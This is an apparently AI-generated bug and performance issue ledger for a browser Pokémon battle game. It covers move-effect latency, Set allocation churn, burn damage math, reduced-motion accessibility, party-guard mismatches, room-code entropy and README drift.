**Title**: `parseMoveEffects` per-move latency varies ~257× (median 0.012 ms, slowest 3.19 ms) — multi-stat-boost / "dance" moves are the outliers

**Evidence**: 954 distinct moves, valid attacker (Pikachu) + defender (Snorlax), `await engine.parseMoveEffects(atk, def, move, true)`:
```
median = 0.0124 ms   iqr = 0.0063   max = 3.190 ms   (n=954)
slowest: 3.19 Feather Dance | 1.53 Clangorous Soul | 1.50 Coaching | 1.47 Extreme Evoboost
         1.47 Decorate | 1.46 Calm Mind | 1.45 Coil | 1.44 Shell Smash
fastest: ~0.010 ms  (Harden, Sharpen, Hidden Power Water)
variance ratio (slowest / median) ≈ 257×
```
The mandate's >10× variance threshold is exceeded. Every outlier is a stat-stage move that runs a multi-stat boost loop with per-stage logMsg/UI sequencing.

**Repro**: drive `engine.parseMoveEffects(atk, def, movesDB[name], true)` for every move and sort by time. Median is ~40× under the 0.5 ms target; only the boost-loop subset spikes.

**Blast radius**: At sub-millisecond medians the spikes are invisible in jsdom, but Calm Mind / Bulk Up / Shell Smash / Clangorous Soul are heavily used in trainer setup sets, and in a real browser the per-stage UI work pays layout/paint cost the harness doesn't model — so the relative spike could grow on-device. Not user-perceptible today (worst case 3.2 ms).

**Fix sketch**: For multi-stat-boost moves, batch the UI/log update once after all stages resolve instead of per-stage (`changeStage` appears to drive a logMsg/updateUI per stat). Profile Feather Dance / Clangorous Soul specifically.

**Verification**: Re-run the per-move sort; expect the slow moves to drop sub-millisecond and the variance ratio below ~20×.

---

## <a id="ISSUE-160"></a> ISSUE-160: `parseMoveEffects` re-allocates 19 constant `Set` literals on every call and pays a 2–14 ms one-time JIT cost on first touch of each branch (warm cost is fine at ~0.01 ms)

---
id: ISSUE-160
severity: P3
category: perf
anchor_symbol: parseMoveEffects
current_line_hint: ~25463
file: battle.html
agents: [performance-profiler]
fingerprint: ba0eda6f97e7
confidence: high
status: open
---

**Title**: `parseMoveEffects` re-allocates 19 constant `Set` literals on every call and pays a 2–14 ms one-time JIT cost on first touch of each branch (warm cost is fine at ~0.01 ms)

**Evidence**:
```js
// battle.html:25463, 25471, 25481, 25482 … — 19 `new Set([...])` literals rebuilt PER CALL inside the
// async parseMoveEffects body (a ~1100-line function), e.g.:
const powderMoves = new Set(["Sleep Powder","Spore","Stun Spore","Poison Powder",...]);
const _selfTargetMoves = new Set(["Swords Dance","Nasty Plot","Calm Mind", /* ~60 names */ ]);
```
Measured (954 moves, valid attacker/defender): **warm median 0.0147 ms/call, max-after-warmup ~0.01 ms — every move is fast once JIT-compiled.** The apparent "variance" is purely cold-path: the FIRST touch of the stat-boost / multi-branch path costs Shell Smash 14.2 ms, Decorate/Coaching ~2.3 ms, then drops to ~0.01 ms on repeat (`/tmp/coldpath.mjs`, `/tmp/setalloc.mjs` this session). This corrects the prior "257× per-call variance" read — it is JIT warmup of a megamorphic function, not a pathological per-call algorithm.

**Repro**: `engine.parseMoveEffects(atk, def, movesDB[name], true)` — measure first call vs. repeated calls per move; first-touch of stat-boost moves spikes, warm calls are flat.

**Blast radius**: Not user-perceptible today (warm ~0.01 ms ≪ 0.5 ms target; first-touch spikes are one-time and hidden behind boot/first-turn). The concern is forward-looking: 19 fresh `Set` allocations per call is avoidable GC churn that grows as more named-move handlers are added, and a 1100-line megamorphic async function is a deopt risk the redesign will amplify.

**Fix sketch**: Hoist the 19 constant `Set` literals to module scope (build once) instead of re-allocating per call. Optionally split the named-move handlers into a lookup table so the function is not one megamorphic body — this reduces both the cold-path JIT cost and per-call allocation.

**Verification**: After hoisting the Sets, confirm warm per-call time is unchanged (~0.01 ms) and that a heap-allocation profile shows zero `Set` allocations inside `parseMoveEffects` per call.

---

## <a id="ISSUE-161"></a> ISSUE-161: Burn applied as final-damage multiplier (`modifier *= 0.5`) instead of halving the attack stat pre-floor

---
id: ISSUE-161
severity: P3
category: inconsistency
anchor_symbol: parseMoveEffects-burn-modifier
current_line_hint: ~21827
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 67e4da6efcae
confidence: medium
status: wontfix-corner-case-common-path-matches-showdown-by-the-hp
---

**Title**: Burn applied as final-damage multiplier (`modifier *= 0.5`) instead of halving the attack stat pre-floor

**Evidence**:
```js
// battle.html:21827
if (attacker.status === "BRN" && move.cat === "Physical" && attacker.ability !== "Guts") modifier *= 0.5;
```

Showdown halves the *attack stat* before the damage formula's `floor()`. The engine instead halves the final modifier. Common-case empirical check (Tackle 34 → 17 = 0.500) matches Showdown to the HP, but corner cases (very low attack stats, certain ability + screen interactions) can deviate by ±1 HP.

**Repro**: Construct a scenario where `floor(atk/2) * other` differs from `floor((atk*other) * 0.5)` — e.g., attacker with very low atk (~10) and a fractional `other` multiplier from screens.

**Blast radius**: Low. May matter for OHKO calcs against bulky walls. Range-assertion tests pass; point-comparison tests against `@smogon/calc` could surface a delta.

**Fix sketch**: Either rewrite as `A *= 0.5` near attack-stat computation (~21260 region), OR document the deviation in `tests/reports/deviations.md`.

**Verification**: Add a focused test: low-atk burned attacker vs screened defender; damage matches Showdown's `@smogon/calc` to the HP.

---

## <a id="ISSUE-162"></a> ISSUE-162: Stat-change status moves (Decorate, Coaching, Baby-Doll Eyes, Calm Mind) are 50–100× slower than damage moves — `changeStage` calls `logMsg` 1–3× per stat tick, each hitting the 903-key tooltipDict scan

---
id: ISSUE-162
severity: P3
category: perf
anchor_symbol: parseMoveEffects-changeStage-tooltipScan
current_line_hint: ~26754
file: battle.html
agents: [performance-profiler]
fingerprint: d3c965d13f23
confidence: high
status: open
---

**Title**: Stat-change status moves (Decorate, Coaching, Baby-Doll Eyes, Calm Mind) are 50–100× slower than damage moves — `changeStage` calls `logMsg` 1–3× per stat tick, each hitting the 903-key tooltipDict scan

**Evidence**:
```js
// battle.html:26754 — Charm/Baby-Doll Eyes do ONE changeStage call
if (move.name === "Charm" || move.name === "Baby-Doll Eyes") { changeStage(defender, 'atk', -2, true); return; }
// battle.html:27576-27595 — changeStage interior, every stat tick fires logMsg
mon.stages[stat] = Math.max(-6, Math.min(6, mon.stages[stat] + amount));
if (mon.stages[stat] === oldStage) { logMsg(`${mon.name}'s ${stat.toUpperCase()} won't go any ${amount > 0 ? 'higher' : 'lower'}!`, 'info'); return; }
...
if (amount > 0) AudioSystem.playUiSfx('statUp', 0.5);
else AudioSystem.playUiSfx('statDown', 0.5);
if (amount > 2) logMsg(`${mon.name}'s ${statName} rose drastically!`, 'heal');
...
showStatArrow(amount > 0, mon === state.pActive);
```

**Repro**: 200 moves × 3 passes via `engine.parseMoveEffects`, jsdom harness, 2026-05-28 (`/tmp/deep-perf.mjs`). Top 10 slowest medians:

| Move           | Median ms | Max ms |
|----------------|-----------|--------|
| Decorate       |     1.740 |  1.793 |
| Coaching       |     1.595 |  1.613 |
| Baby-Doll Eyes |     0.861 |  1.022 |
| Aromatic Mist  |     0.857 |  0.952 |
| Breaking Swipe |     0.855 |  0.880 |
| Captivate      |     0.836 |  1.535 |
| Bitter Malice  |     0.826 |  1.611 |
| Calm Mind      |     0.818 |  1.424 |
| Confide        |     0.813 |  1.054 |
| Double Team    |     0.811 |  0.841 |

Bottom 5 (Tackle/Double Slap/Dragon Tail) median ~0.015 ms. Spread: **~110× from fastest to slowest.** Charts directly with logMsg-per-stat-tick count: Decorate raises +2 in two stats = ~4 logMsg calls × 0.32 ms = ~1.3 ms, matching observed 1.7 ms once `playUiSfx` + `showStatArrow` DOM work is added.

**Blast radius**: A setup-sweeper turn (Dragon Dance, Calm Mind, Bulk Up, Shell Smash) executes a stat-change-heavy parseMoveEffects on **every player turn for the first 2-3 turns of most battles**. At 0.8-1.7 ms per move, that's the dominant cost slice of those turns. Multi-stat moves (Shell Smash: 6 ticks, Quiver Dance: 3 ticks) compound. Linked to ISSUE-154/155 (P3 already in ledger) as the underlying mechanism.

**Fix sketch**: Fixing the logMsg scan (see fingerprint 290cc0fb39e4 above) is the primary lever — drops these costs by ~70%. Secondary: hoist the `statNames`/`stat.toUpperCase()` calls and inline the `mon.volatile.statsRaisedThisTurn` object-init out of the hot path.

**Verification**: Re-time Decorate/Coaching/Calm Mind after the logMsg fix; expect ~0.3 ms each (a 5× drop). Variance ratio (slowest:fastest) should fall from 110× to under 20×.

---

## <a id="ISSUE-163"></a> ISSUE-163: Hand-quantification of parseMoveEffects Set-literal churn — 18 `new Set([...])` per call, 13 μs of pure allocation per call (≈70% of warm 18 μs median)

---
id: ISSUE-163
severity: P3
category: perf
anchor_symbol: parseMoveEffects-sets-warm
current_line_hint: ~25859
file: battle.html
agents: [performance-profiler]
fingerprint: d2f020bcc302
confidence: high
status: open
---

**Title**: Hand-quantification of parseMoveEffects Set-literal churn — 18 `new Set([...])` per call, 13 μs of pure allocation per call (≈70% of warm 18 μs median)

**Evidence**: Counted `new Set(` occurrences in `parseMoveEffects` body (battle.html:25853–~26900): **18 distinct Set literals**, ranging in size from 3 elements (`hardBlockAll`) to 53 (`_selfTargetMoves`). The first ~5 fire on every call (powderMoves, magicBounceMoves, _subBypassMoves, _selfTargetMoves, sometimes _ccBanned); the remaining 13 fire in conditional branches but together compose the typical hot path.

```js
// battle.html:25859 — first Set, fires on every call regardless of move type
const powderMoves = new Set(["Sleep Powder","Spore","Stun Spore","Poison Powder","Rage Powder","Cotton Spore","PoisonPowder","Powder"]);
if (powderMoves.has(move.name)) { ... }
// battle.html:25867
const magicBounceMoves = new Set(["Will-O-Wisp","Thunder Wave",...]);  // 39 elements
// battle.html:25877
const _subBypassMoves = new Set([...]);  // 18 elements
// battle.html:25878
const _selfTargetMoves = new Set([...]);  // 53 elements
// ...total 18 Sets allocated through the function body
```

**Repro**: Isolated micro-bench (`/tmp/setbench.mjs`, 2026-05-28) replaying the actual literal contents from `parseMoveEffects`:
- Per-call allocation of all 17 Sets × 50,000 iterations: **653 ms, i.e. 13.1 μs per call.**
- Hoisted (constants) × 50,000 same has-checks: **1.91 ms total, i.e. 0.04 μs per call.**
- **Savings: ~13 μs per parseMoveEffects call. The function's warm median is 18 μs, so this is ~70% of the per-call cost.**

This restates and quantifies ISSUE-156 (P3 already in ledger). ISSUE-156 counted 19 (probably included a redundant declaration); the live audit counts 18 inside `parseMoveEffects` proper. Numbers may shift slightly when `parseMoveEffects` is refactored; the takeaway is the order-of-magnitude saving.

**Blast radius**: At ~18 μs / move and 2 moves per turn (player + foe), ~36 μs / turn. Across a 30-turn battle, ~1 ms. Across a 100-battle replay, ~100 ms of CPU. Per battle the saving is invisible; **the value is that it scales**: every new Set literal added inside `parseMoveEffects` linearly costs μs per call. Story content (new moves added with new ban-lists) will continue to drift this up unless the pattern is moved out.

**Fix sketch**: Hoist all 18 Sets to module-level `const` declarations. The Sets are immutable; freezing is not required. Existing examples at battle.html:10165–10185 (`_SETUP_MOVES`, `_HAZARD_MOVES`, etc.) show the pattern already in use elsewhere in the file.

**Verification**: Bench `parseMoveEffects` per-move median after hoisting; expect median to drop from 0.018 ms → 0.005 ms (a ~3.5× speedup) and the per-turn cost to fall correspondingly. Status moves (Decorate etc.) will see proportional improvement once the logMsg fix is also in.

---

## <a id="ISSUE-164"></a> ISSUE-164: 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded

---
id: ISSUE-164
severity: P3
category: a11y
anchor_symbol: prefers-reduced-motion
current_line_hint: ~58
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b14deb83ca98
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded

**Evidence**:
```
$ grep -cE '@keyframes' battle.html
129
$ grep -cE 'prefers-reduced-motion' battle.html
5
$ grep -nE 'prefers-reduced-motion' battle.html
58:        @media (prefers-reduced-motion: reduce) {           # confetti, badge, rotate icon, hp-critical (4 rules)
5383:       @media (prefers-reduced-motion: reduce) {           # casino flip/wheel/slots/jackpot
6206:       @media (prefers-reduced-motion: reduce) {           # screen-trans + bottom-sheet
8696:        if (… '(prefers-reduced-motion: reduce)').matches) return;   # one-off in JS
26796:                try { return !!(… '(prefers-reduced-motion: reduce)').matches); }  # StoryFx isReduced flag
```

Storage of the StoryFx flag (line 26796) covers JS-driven sequences nicely, but pure CSS animations escape it. Examples of unguarded multi-second animations: `storyTutorialOverlayIn` / `storyTutorialSpriteIn` / `storyTutorialNameIn` / `storyTutorialDialogIn` (tutorial reveal cascade, lines ~4267-4296), `storyCatchMasterPulse` (Master Ball, infinite 2.2s loop, line ~1912), `storyBadgePulse` (victory badge — the line-60 override hits `.story-victory-badge-slot` but the `@keyframes storyBadgePulse` continues running on any other element that uses it).

**Repro**: macOS System Settings → Accessibility → Reduce Motion → On. Trigger first wild — sprite still scales & translates from off-screen; Master Ball still pulses every 2.2 s.

**Blast radius**: Vestibular-disorder users get the same motion onslaught as the default theme. Infinite pulse loops are particularly hostile.

**Fix sketch**: Wrap CSS animation declarations in a single `@media (prefers-reduced-motion: reduce) { *[class*="story-tutorial-"] { animation: none !important; } .story-catch-ball--master { animation: none !important; box-shadow: 0 0 14px rgba(206,147,216,0.55) !important; } … }` block. Audit the 129 keyframes and short-list the ≥800 ms / infinite ones (probably ~25 selectors).

**Verification**: With reduced-motion on, no element on the catch screen or tutorial overlay animates for >100 ms.

---

## <a id="ISSUE-165"></a> ISSUE-165: proceedToNextBattle guards on total team length, but the launch path guards on non-egg fighter count — an all-egg party advances eventIndex then bounces

---
id: ISSUE-165
severity: P3
category: bug
anchor_symbol: proceedToNextBattle
current_line_hint: ~41826
file: battle.html
agents: [story-mode-investigator]
fingerprint: 7a285290260d
confidence: low
status: open
---

**Title**: proceedToNextBattle guards on total team length, but the launch path guards on non-egg fighter count — an all-egg party advances eventIndex then bounces

**Evidence**:
```js
function proceedToNextBattle() {
    if (sm.team.length === 0) { ...return; }   // counts eggs
    // ...later sets sm.eventIndex = nextBattleIdx; save();
}
// vs the launch path:
if (_storyCountFighters() === 0) { window.showGameAlert('You have no Pokémon...'); enterCity(); return; } // excludes eggs
```

**Repro**: `proceedToNextBattle` passes its guard whenever `sm.team.length > 0` — including a party that is all eggs (0 fighters). It then advances `sm.eventIndex` to the next Battle row and saves BEFORE `enterBattleEvent`'s `_storyCountFighters() === 0` guard fires, bounces to city, and `eventIndex` is left on (or near) the battle row until the next city walk-back. Currently NOT reachable in normal play — `pcDeposit`/`pcSell`/`pcRelease` all block removing the last non-egg fighter (`_pcTeamHasOnlyOneMon` counts `!isEgg`), so a 0-fighter party can't form. Latent guard mismatch, not an exploit today.

**Blast radius**: None observed; defensive only. Becomes a real bounce/soft-lock if any future feature lets eggs fully occupy the party (e.g. multi-egg daycare, egg-only gifts).

**Fix sketch**: Make `proceedToNextBattle` use `_storyCountFighters() === 0` for parity with the launch guard, and don't advance `sm.eventIndex` before confirming a fightable party.

**Verification**: Force an all-egg `sm.team`, call `proceedToNextBattle` — confirm eventIndex is NOT advanced and the player is routed to the Professor/city without a stale battle index.

---

## <a id="ISSUE-166"></a> ISSUE-166: proceedToNextBattle "no Pokémon" guard counts eggs (team.length) while the fight launch counts only fighters — egg-only party advances then bounces

---
id: ISSUE-166
severity: P3
category: inconsistency
anchor_symbol: proceedToNextBattle
current_line_hint: ~41881
file: battle.html
agents: [story-mode-investigator]
fingerprint: a1eccebec359
confidence: medium
status: open
---

**Title**: proceedToNextBattle "no Pokémon" guard counts eggs (team.length) while the fight launch counts only fighters — egg-only party advances then bounces

**Evidence**: `proceedToNextBattle` (~41881) gates on raw party length:
```js
if (sm.team.length === 0) { window.showGameAlert('You have no Pokémon. Visit the Professor first.'); return; }
```
But eggs occupy a party slot (`isEgg:true`) and cannot battle, and the rest of the codebase counts fighters via `_storyCountFighters()` (`team.filter(s => s && !s.isEgg).length`) — including the actual fight launch (~42457: `if (_storyCountFighters() === 0) { ...; enterCity(); return; }`). An egg-only party (team.length 1, fighters 0) passes the `proceedToNextBattle` guard, advances `sm.eventIndex` to the battle, fires the cold-open and route wilds, then is bounced back to the city by the `startFight` guard — and the eventIndex has already been advanced. (Combined with the cold-open re-entry bug, the bounce can stack overlays.)

**Repro**: Set a party to a single egg slot, call `StoryMode.proceedToNextBattle()` — it advances/bounces instead of warning up front. Egg-only is hard to reach via UI (deposit/daycare guard the last fighter via a DISABLED button, but `_daycareDropOff`'s handler ~40054 lacks the `lastInParty` re-check that `evoLabEvolve` and friends have), so this is defense-in-depth rather than a confirmed live path.

**Blast radius**: No-Pokémon edge handling; consistency of the fighter-count contract.

**Fix sketch**: Use `_storyCountFighters() === 0` in `proceedToNextBattle` (and add the `lastInParty` guard inside `_daycareDropOff` to match the disabled-button gate).

**Verification**: With an egg-only party, `proceedToNextBattle` should warn and NOT advance the eventIndex.

---

## <a id="ISSUE-167"></a> ISSUE-167: Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost

---
id: ISSUE-167
severity: P3
category: bug
anchor_symbol: randomCode
current_line_hint: ~44
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: aee012742c28
confidence: medium
status: wontfix-room-code-is-addressing-not-secret-tokens-protect-writes
---

**Title**: Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost

**Evidence**:
```js
// online-pvp.js L44-49
function randomCode() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';   // 32 chars (no I/O/1/0 → ambiguous-safe)
    let s = '';
    for (let i = 0; i < 6; i++) s += chars[Math.floor(Math.random() * chars.length)];
    return s;
}
// L341-351 retry loop tolerates 8 collisions before giving up.
```

**Repro**: 32^6 = ~1.07 billion codes; birthday paradox says collision probability hits 50% at ~37K codes simultaneously in flight. With 8 retries the practical ceiling is much higher (each attempt has 1 - codes_in_use/1e9 ≈ 1 success prob even at 1M live rooms), so this is fine *for correctness*. The real concern is enumeration: an attacker who can call `fetchRoomByCode(code)` (no rate limit visible) can brute-force the ~1B codespace. At 10 lookups/sec from a single client and the open SELECT policy, finding a specific 6-char code takes a year on average; finding *any* live room takes seconds (~1000 rooms / 1B = ~1M attempts = 27 hours). With the open RLS, the attacker can short-circuit by `select('code') from pvp_rooms` instead — making the codespace strength irrelevant.

**Blast radius**: Defensive. Under tightened RLS (see the P0/P1 RLS findings), the code becomes the secret that gates joining; at that point, 30-bit entropy is shaky for a feature meant to defend against opportunistic eavesdroppers. Realistically, room codes need to be share-friendly (length 6, no ambiguous chars) so the 30 bits cap is by design.

**Fix sketch**: For correctness alone, no change needed (the retry on 23505 handles collisions). For privacy of in-progress matches: combine the code with an opaque per-room access token returned from `createRoom` and required as a header on every read (see the P1 SELECT-RLS finding's RPC design). The code stays human-shareable; the token is the real secret.

**Verification**: Existing integration test `tests/integration/pvp-stub.test.js:101-111` samples 1000 codes and asserts ≥990 unique — this validates collision rate, not unguessability.

---

## <a id="ISSUE-168"></a> ISSUE-168: README calls shipped catch / PC / Underground / Safari / boss-arc systems "upcoming"

---
id: ISSUE-168
severity: P3
category: dx
anchor_symbol: README.md
current_line_hint: n/a
file: README.md
agents: [spec-drift-auditor]
fingerprint: 1f3b34879073
confidence: high
status: open
---

**Title**: README calls shipped catch / PC / Underground / Safari / boss-arc systems "upcoming"

**Evidence**:
```
README.md:44
  "See STORY_MODE_FLOW.md for the working spec of the upcoming
   catch / PC / Underground / Safari / boss-arc systems."
Reality (all shipped & reachable):
  catch  -> #screen-story-catch + StoryMode.catchThrow   Safari -> 236 hits, City4
  PC     -> sm.pcBox (44 hits), story-pc-tab-storage-btn  Underground -> story-pc-tab-underground-btn (sells mons for gold)
  boss-arc -> _bossArcRollLegendary (Caged God, 15 hits)
```

**Repro**: `grep -cniE "safari|pcBox|underground|_bossArcRollLegendary" battle.html` confirms each system is live in the UI. README still frames them as future work.

**Blast radius**: Low — README is a dev/testing doc, not user-facing feature copy. But it is the entry point the repo points new contributors to (and links STORY_MODE_FLOW.md as the "working spec of upcoming" systems), so it understates what is actually shipped. Required-check #6 (README claims reachable): all named systems ARE reachable; the staleness is the "upcoming" framing, not an unreachable claim.

**Fix sketch**: Reword README line 44 to "the shipped catch / PC / Underground / Safari / boss-arc systems" (or split shipped vs. still-deferred: Black Market / wager / trader / itinerary remain unshipped per the deferred ledger items). Doc owner's edit.

**Verification**: README no longer labels live systems "upcoming".

---

## <a id="ISSUE-169"></a> ISSUE-169: Nature Rater availability is gappy (C0, C3, C5–C9) — absent C1/C2/C4 with no unlock rationale

---
id: ISSUE-169
severity: P3
category: balance
anchor_symbol: renderCityActions
current_line_hint: ~38989
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4066d35d9141
confidence: high
status: open
---

**Title**: Nature Rater availability is gappy (C0, C3, C5–C9) — absent C1/C2/C4 with no unlock rationale

**Evidence**:
```text
Move Tutor   present at: C0, C2, C3, C4, C5, C6, C7, C8, C9   (skips C1 only)
Nature Rater present at: C0,     C3,     C5, C6, C7, C8, C9   (skips C1, C2, C4)
```

**Repro**: Per-city action extraction from `STORY_EVENTS_RAW`. Both Move Tutor and Nature Rater are "always-on RNG-negators" per REDESIGN_PLAN §2, but the actual literal omits Nature Rater at C1/C2/C4 and Move Tutor at C1. There is no `actions.includes('Nature Rater')` gate beyond the literal — the absence is just missing array entries, not a deliberate unlock condition. So a player who wants to fix a bad nature at C2/C4 simply can't.

**Blast radius**: Inconsistent service availability for two facilities the design treats as ubiquitous. A nature-locked mon caught/gifted at C2 waits until C3 for the Rater.

**Fix sketch**: Either (a) add 'Move Tutor'/'Nature Rater' to the missing City rows' action arrays for true always-on, or (b) if the omissions are intentional pacing (city-specialty per §14c), document them in `CITY_SPECIALTY_BLURBS` and STORY_MODE_FLOW. REDESIGN_PLAN §2 already proposes the "always-on" fix.

**Verification**: Re-extract action lists; confirm Nature Rater appears (or is documented-absent) at every city.

---

## <a id="ISSUE-170"></a> ISSUE-170: Party count chip shows "(N/6)" regardless of the actual badge-driven cap

---
id: ISSUE-170
severity: P3
category: bug
anchor_symbol: renderTeamPanel
current_line_hint: ~36657
file: battle.html
agents: [story-mode-investigator]
fingerprint: c83c6453be8a
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Party count chip shows "(N/6)" regardless of the actual badge-driven cap

**Evidence**:
```js
// battle.html ~36657
if (countEl) countEl.textContent = sm.team.length ? `(${sm.team.length}/6)` : '';
```
`_storyMaxPartySize()` returns `Math.max(2, Math.min(6, 2 + badges))` — so a 0-badge player has a cap of **2**, not 6. The party count shows "1/6" at City 0 even though the player can only field 2.

**Repro**: Start a fresh story run, take a starter, look at the HUD's party count.

**Blast radius**: Cosmetic. The player who reads "1/6" might think they can hold 6 mons and be surprised when Catch Tutorial overflows to PC. Also subtly conveys the wrong difficulty signal.

**Fix sketch**: 
```js
const _capForDisplay = (typeof _storyMaxPartySize === 'function') ? _storyMaxPartySize() : 6;
countEl.textContent = sm.team.length ? `(${sm.team.length}/${_capForDisplay})` : '';
```
The PC overflow error message at line 40487 already does this correctly (`${maxParty}`), so this is the lone display lag.

**Verification**: At 0 badges with 1 mon, chip should read "1/2"; at 4 badges with 5 mons, chip should read "5/6".

---

## <a id="ISSUE-171"></a> ISSUE-171: CONFIRMED FIXED — RIVAL_ATTACK_TYPE_DECAY is now 10 (prior audit 1.2 had ÷30 too-aggressive)

---
id: ISSUE-171
severity: P3
category: balance
anchor_symbol: RIVAL_ATTACK_TYPE_DECAY
current_line_hint: ~33108
file: battle.html
agents: [story-mode-investigator]
fingerprint: de6142450105
confidence: high
status: open
---

**Title**: CONFIRMED FIXED — RIVAL_ATTACK_TYPE_DECAY is now 10 (prior audit 1.2 had ÷30 too-aggressive)

**Evidence**:
```js
const RIVAL_ATTACK_TYPE_DECAY = 10;   // battle.html:33108 (was 30)
```

**Repro**: Prior audit 1.2 said `RIVAL_ATTACK_TYPE_DECAY = ÷30` neutralized the rival's counter-pick after 1–2 picks. It is now 10 (33108), used in `_rivalScoreAttackTypeVsParty` weighting (33155/33177). Rivals counter-pick more persistently against monotype parties. Reads live `sm.team` (does not filter `wild:true` per spec §3).

**Blast radius**: Tier-2 #10 — resolved.

**Fix sketch**: None — confirmation.

**Verification**: Face a rival with a monotype party; confirm sustained type counter-picking across slots.

---

## <a id="ISSUE-172"></a> ISSUE-172: Mystery Figure intro pool fallback uses 2 lines but the identity's `intros` field has 4 — falls back silently if the identity object lacks `intros`

---
id: ISSUE-172
severity: P3
category: bug
anchor_symbol: rollMysteryFigureFinalBossTeam
current_line_hint: ~38014
file: battle.html
agents: [story-mode-investigator]
fingerprint: b99d78121766
confidence: high
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Mystery Figure intro pool fallback uses 2 lines but the identity's `intros` field has 4 — falls back silently if the identity object lacks `intros`

**Evidence**:
```js
// battle.html ~38016
let trainer = isMysteryFinal
    ? {
        role: 'Mystery Figure',
        ...
        introQuotes: (_mysteryFinalFace && _mysteryFinalFace.intros) || [
            'Your Hall of Fame crown means nothing here.',
            'Show me your strongest six.'
        ]
    }
```
The 2-line fallback would be used if the rolled `mysteryIdentity` somehow doesn't have an `intros` field. All currently-shipped identities (`cyrus`, `ghetsis`, `cynthia`, `steven`, `n`, `red`, `lance`, `buried_alive`, `cartridge_self`) DO have `intros: [...]` — so the fallback is dead in practice. But if a future identity is added without `intros`, the fight silently rolls 2 generic lines instead of catching the omission.

**Repro**: Add a test identity to MYSTERY_FIGURE_IDENTITIES with no `intros` field. The Mystery Figure final fight uses the 2-line fallback.

**Blast radius**: Future-proofing only. No current user impact.

**Fix sketch**: Either (a) move the fallback to be a console.warn + explicit asserter so missing `intros` is caught at the call site; or (b) tighten the type contract by adding a `_validateMysteryIdentity` assertion in `MYSTERY_FIGURE_IDENTITIES` boot block.

**Verification**: Add an identity without `intros`; expect a console warning instead of silent fallback.

---

## <a id="ISSUE-173"></a> ISSUE-173: Mystery Figure climax boss has ZERO gimmicks if the player disabled all 4 mechanics at run start — the "force all on" ctx is dead-coded

---
id: ISSUE-173
severity: P3
category: inconsistency
anchor_symbol: rollMysteryFigureFinalBossTeam
current_line_hint: ~34631
file: battle.html
agents: [story-mode-investigator]
fingerprint: cb88ee48b37a
confidence: high
status: open
---

**Title**: Mystery Figure climax boss has ZERO gimmicks if the player disabled all 4 mechanics at run start — the "force all on" ctx is dead-coded

**Evidence**:
```js
const _mechCtx = { settings: { ...sm.settings, megaOn: true, dynaOn: true, teraOn: true, zOn: true } };
// ...but _applyEnemyGimmickDistribution → _storyEnemyMechKeys ANDs with sm.unlockedGimmicks:
//   if (S.megaOn && unlocked.has('mega')) k.push('mega');   ← unlocked is empty
return _applyStoryBuildPowerTier(_applyEnemyGimmickDistribution(picks, 'Mystery Figure', _mechCtx), 'Mystery Figure', null);
```

**Repro**: Start a run with all 4 mechanic checkboxes (Mega/Z/Dynamax/Tera) unchecked — all default checked but are user-toggleable, with no floor forcing at least one. `sm.unlockedGimmicks` then stays `[]` forever (it's filled from `sm.settings.*On`, ~line 42687). At the post-HoF Mystery Figure, `rollMysteryFigureFinalBossTeam` forces `megaOn:true` etc. in `_mechCtx`, but `_storyEnemyMechKeys` requires `unlockedGimmicks.has('mega')` too — so it returns `[]` and the climactic boss (which guarantees 6 gimmick mons via `_minGuaranteedMechsForEvent`) gets zero. Verified by emulating `_storyEnemyMechKeys` with forced ctx + empty unlocked → keys = [].

**Blast radius**: The intended climax difficulty spike is silently nullified for all-mechanics-off runs. Not a crash; the boss is just a standard G1 team. The comment "Final boss rolls from every unlocked mechanic" is misleading — the forced ctx settings never override the unlock gate.

**Fix sketch**: Either make the Mystery Figure's mech keys ignore `unlockedGimmicks` (the post-HoF boss is meant to transcend the player's run gates), or drop the dead `_mechCtx` setting-override and document that an all-off run yields a gimmickless climax by design.

**Verification**: All-mechanics-off run reaching the Mystery Figure — assert the boss team has ≥1 gimmick (if the intended behavior is "always gimmicked") or document the no-gimmick outcome.

---

## <a id="ISSUE-174"></a> ISSUE-174: `rollTrainerTeam` cold-call is **1.63 ms median (max 3.22 ms)**; well under the 50 ms target but worth recording as the deep-dive baseline before the upcoming difficulty-curve work

---
id: ISSUE-174
severity: P3
category: perf
anchor_symbol: rollTrainerTeam
current_line_hint: ~34915
file: battle.html
agents: [performance-profiler]
fingerprint: 82c78848cd39
confidence: medium
status: open
---

**Title**: `rollTrainerTeam` cold-call is **1.63 ms median (max 3.22 ms)**; well under the 50 ms target but worth recording as the deep-dive baseline before the upcoming difficulty-curve work

**Evidence**:
```js
// battle.html:34915 — entry point exposed via window.__rivalTest.rollTrainerTeam
function rollTrainerTeam(trainer, partySize, gradeWeights, enabledGensIn, battleEventType, storyRowIdx) {
    const rng = (sm && sm.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random;
    let gwIn = applyDifficultyToGradeWeights(gradeWeights || { g1: 0, g2: 0, g3: 50, g4: 50 });
    gwIn = applyStoryProgressToGradeWeights(gwIn, storyRowIdx);
    ...
    const _poolKey = (isMixed ? 'mixed' : types.slice().sort().join('+')) + '|' + Array.from(genSet).sort((a, b) => a - b).join(',');
    let T = _trainerPoolCache.get(_poolKey);  // cache keyed on type+gens — hit rate is the main lever
```

**Repro**: 10 trainers (Brock, Misty, Lt.Surge, Erika, Sabrina, Blaine, Giovanni, Lance, Steven Stone, Cynthia), 5 trials each, 1 warmup, all gens enabled, gradeWeights {g3:50,g4:50}. (`/tmp/deep-perf2.mjs`, 2026-05-28.)
- **All 50 samples**: median **0.71 ms**, p95 **2.09 ms**, max **6.62 ms**, mean **0.97 ms**.
